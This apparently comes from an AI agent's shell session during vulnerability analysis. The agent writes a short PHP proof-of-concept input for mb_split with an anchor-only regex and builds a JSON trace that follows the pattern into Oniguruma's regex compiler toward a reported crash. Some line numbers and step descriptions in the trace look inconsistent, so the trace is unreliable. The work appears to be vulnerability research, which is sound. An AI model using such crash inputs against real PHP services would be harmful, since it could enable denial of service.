Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.txt')
p.write_text('<?php\nmb_regex_set_options("m");\nmb_split("^", "a\nb\nc");\n?>\n')
trace=[
{"step":1,"file":"ext/mbstring/tests/mb_split_empty_match.phpt","function":"<global>","line":1,"var":"pattern","code":"mb_split('^', \"a\\nb\\nc\");","note":"The attacker supplies an anchor-only regex that can match an empty position, exercising the split code's empty-match handling."},
{"step":2,"file":"ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":None,"var":"pattern","code":"mb_split forwards the anchor pattern into the mbregex compiler.","note":"The pattern is parsed by Oniguruma under the mbstring wrapper before any splitting occurs."},
{"step":3,"file":"oniguruma/src/regcomp.c","function":"tune_tree","line":5518,"var":"NODE_ANCHOR","code":"case NODE_ANCHOR: r = tune_anchor(node, reg, state, env);","note":"Compilation reaches anchor tuning, which is relevant because the pattern matches empty positions and affects quantifier bookkeeping."},
{"step":4,"file":"oniguruma/src/regcomp.c","function":"tune_tree","line":5518,"var":"NODE_QUANT","code":"case NODE_QUANT: r = tune_quant(node, reg, state, env);","note":"The empty-match pattern still flows through quantifier processing for the surrounding regex tree."},
{"step":5,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"The compiler computes whether the repeated body can be empty or memory-bearing, which is the state used by the crash report."},
{"step":6,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"quantifiers_memory_node_info(Node* node)","note":"The recursive analysis walks the AST produced from the attacker-controlled pattern and propagates emptiness information."},
{"step":7,"file":"oniguruma/src/regcomp.c","function":"tune_tree","line":5504,"var":"env->backtrack_mem","code":"MEM_STATUS_ON(env->backtrack_mem, en->m.regnum);","note":"Capture/backtrack state is updated while tuning, tying the empty-match pattern to the memory bookkeeping that later goes wrong."},
{"step":8,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5470,"var":"compiled regex","code":"r = tune_tree(body, reg, state, env);","note":"The tuned automaton is finalized and then used by mb_split, which is the runtime sink for the vulnerable behavior."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, ensure_ascii=False))
PY
cat /workspace/poc.txt && python3 - <<'PY'
import json
print(json.load(open('/workspace/candidate_trace.json'))[0])
PY
